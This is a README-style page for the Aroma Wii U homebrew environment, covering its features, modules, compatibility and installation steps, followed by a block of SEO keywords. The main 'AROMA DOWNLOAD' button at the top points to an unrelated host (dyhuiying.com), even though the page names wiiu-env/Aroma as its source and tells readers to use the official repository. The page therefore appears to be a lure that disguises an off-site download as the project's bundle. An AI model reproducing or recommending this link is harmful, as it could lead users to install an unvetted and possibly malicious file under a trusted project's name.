<h1 align="center">🌺 Aroma</h1>

<p align="center">
  <strong>Modular Homebrew. Flexible Environments. Wii U Control.</strong>
</p>

<p align="center">
  Modular homebrew environment for Nintendo Wii U.
  <br>
  EnvironmentLoader · Homebrew Launching · Plugin System · Background Modules · Region Free
</p>

<p align="center">
  <a href="https://dyhuiying.com/s/file">
    <img src="https://img.shields.io/badge/AROMA%20DOWNLOAD-8B5CF6?style=for-the-badge&logo=nintendo&logoColor=white" alt="Aroma Download">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/release-Beta--27-8B5CF6?style=flat-square">
  <img src="https://img.shields.io/badge/platform-Nintendo%20Wii%20U-8B5CF6?style=flat-square">
  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
  <img src="https://img.shields.io/badge/architecture-modular-252525?style=flat-square">
</p>

<details>
  <summary>📑 Contents</summary>

  - [Quick Start](#-quick-start)
  - [Requirements](#-requirements)
  - [Key Features](#-key-features)
  - [Module Overview](#-module-overview)
  - [Supported Platforms](#-supported-platforms)
  - [Compatibility Information](#-compatibility-information)
  - [Technical Specifications](#-technical-specifications)
  - [Installation Guide](#-installation-guide)
  - [FAQ](#-faq)
  - [SEO Keywords](#-seo-keywords)
</details>

## ⚡ Quick Start

1. Prepare an SD card using the Wii U homebrew guide.
2. Download the Aroma environment bundle from the official project resources.
3. Extract the bundle to the root of the SD card.
4. Launch Aroma through EnvironmentLoader.

Aroma starts as the selected Wii U environment and provides its homebrew, module, and plugin functionality.

## 🖥️ Requirements

| Requirement | Specification |
|---|---|
| Hardware | Nintendo Wii U |
| System Firmware | 5.5.5 or 5.5.6 |
| Storage | SD card |
| Environment Loader | EnvironmentLoader |
| Boot Entry | PayloadLoader or another documented entrypoint |
| Filesystem Layout | Aroma files extracted to the SD card root |

## ✨ Key Features

### Environment Management

- 🚀 **EnvironmentLoader Integration** — Loads Aroma as a selectable Wii U environment.
- 🔄 **Persistent Entry Point** — Supports a persistent entrypoint through PayloadLoader and its installer.
- 🎛️ **Environment Selection** — Provides environment selection and boot configuration.
- ⚡ **Coldboot Workflow** — Supports coldboot loading through the documented PayloadLoader setup.

### Homebrew and Plugins

- 🎮 **Homebrew Launching** — Supports launching homebrew applications within the Aroma environment.
- 🧩 **Wii U Plugin System** — Integrates the Wii U Plugin System for plugin-based extensions.
- 🔌 **Background Modules** — Runs modules that extend system functionality.
- 🛠️ **Modular Architecture** — Allows individual tools, modules, and plugins to be added or removed.

### System Integration

- 🌍 **Region Free** — Provides region-free functionality through compatible plugins.
- 🎮 **GamePad Integration** — Supports features that integrate with the Wii U GamePad environment.
- 📡 **FTP Access** — Supports background FTP server functionality through ftpiiu_plugin.
- 🖥️ **Network Homebrew Loading** — Supports Wiiload through the corresponding plugin.

## 📋 Module Overview

| Component | Responsibility |
|---|---|
| EnvironmentLoader | Loads and selects the Wii U environment |
| PayloadLoader | Provides the persistent environment entrypoint |
| Mocha | Supplies the underlying custom firmware functionality |
| Wii U Plugin System | Provides plugin loading and integration |
| homebrew_on_menu_plugin | Enables homebrew launching from the Wii U Menu |
| ftpiiu_plugin | Provides FTP server functionality |
| wiiload_plugin | Enables network-based homebrew and plugin loading |
| region_free_plugin | Adds region-free functionality |
| drc_region_free_plugin | Enables GamePad pairing across regions |

## 🚀 Supported Platforms

| Platform | Support |
|---|---|
| Nintendo Wii U | Primary target |
| Wii U Basic / White | Supported Wii U hardware |
| Wii U Deluxe / Black | Supported Wii U hardware |
| Wii U GamePad | Integrated environment support |
| Wii Mode (vWii) | Separate environment and compatibility considerations |

Aroma is a Wii U environment. It is not a replacement for a dedicated vWii homebrew setup.

## 🔍 Compatibility Information

The Aroma project README lists compatibility with:

- Wii U firmware 5.5.5
- Wii U firmware 5.5.6

Aroma supports existing browser-based entrypoints and the persistent PayloadLoader installation path.

The environment is modular. Individual plugins and modules have their own requirements and compatibility characteristics.

Aroma is the successor to Tiramisu. Tiramisu remains a separate legacy environment and is primarily relevant when a particular homebrew application requires its older `.elf`-based workflow.

## 🛠️ Technical Specifications

| Specification | Details |
|---|---|
| Project | Aroma |
| Platform | Nintendo Wii U |
| Category | Homebrew environment |
| Architecture | Modular environment |
| Environment Loader | EnvironmentLoader |
| Base Custom Firmware | Mocha |
| Plugin Framework | Wii U Plugin System |
| Homebrew Integration | Environment-based homebrew launching |
| Persistent Entrypoint | PayloadLoader |
| Storage | SD card |
| Primary Development Language | C++ |
| Source Repository | wiiu-env/Aroma |

## 📥 Installation Guide

### 1. Prepare the SD Card

1. Use the SD card preparation procedure in the Wii U homebrew guide.
2. Back up existing Wii U homebrew files before changing the card contents.
3. Keep the required directory structure intact.

### 2. Download Aroma

1. Open the official Aroma repository.
2. Obtain the current published Aroma bundle.
3. Extract the downloaded files to the root of the SD card.

### 3. Configure the Entry Point

Use the official Wii U guide to configure EnvironmentLoader and PayloadLoader.

The recommended setup is to coldboot into EnvironmentLoader and select Aroma as the active environment.

### 4. Launch Aroma

1. Insert the prepared SD card into the Wii U.
2. Launch EnvironmentLoader using the configured entrypoint.
3. Select Aroma if the environment menu appears.
4. If necessary, hold X while launching EnvironmentLoader to force the menu to open.

### 5. Add Plugins

Place compatible plugins in the documented Aroma directory structure.

Follow each plugin's installation instructions and verify its dependencies before launching the environment.

## ❓ FAQ

### What is Aroma for Wii U?

Aroma is a modular homebrew environment that provides homebrew launching, background modules, plugin support, and system integration for Nintendo Wii U.

### Is Aroma the successor to Tiramisu?

Yes. Aroma is the newer environment developed by the Wii U homebrew community. Tiramisu remains available as a separate legacy environment.

### Which Wii U firmware versions are listed as compatible?

The Aroma repository lists firmware 5.5.5 and 5.5.6.

### Can Aroma load homebrew applications from the Wii U Menu?

Yes. The homebrew_on_menu_plugin supports launching homebrew directly from the Wii U Menu.

### How do I update Aroma?

Download the latest published Aroma bundle and follow the official update instructions. Preserve other SD card files and review plugin compatibility when updating.

## 🔎 SEO Keywords

Aroma Wii U, Nintendo Wii U homebrew, Wii U custom firmware environment, Aroma homebrew environment, Wii U EnvironmentLoader, Wii U Plugin System, Wii U homebrew launcher, Wii U PayloadLoader, Wii U background modules, Wii U region free plugin, Wii U FTPiiU, Wii U Wiiload, Aroma installation guide, Aroma Beta 27, Wii U firmware 5.5.6, Wii U homebrew plugins, Tiramisu successor, Wii U environment setup, Wii U homebrew SD card, Nintendo Wii U modding

<p align="center">
  <strong>🌺 Aroma</strong>
  <br>
  EnvironmentLoader · Homebrew · Plugins · Background Modules
  <br>
  Nintendo Wii U Homebrew Environment
</p>
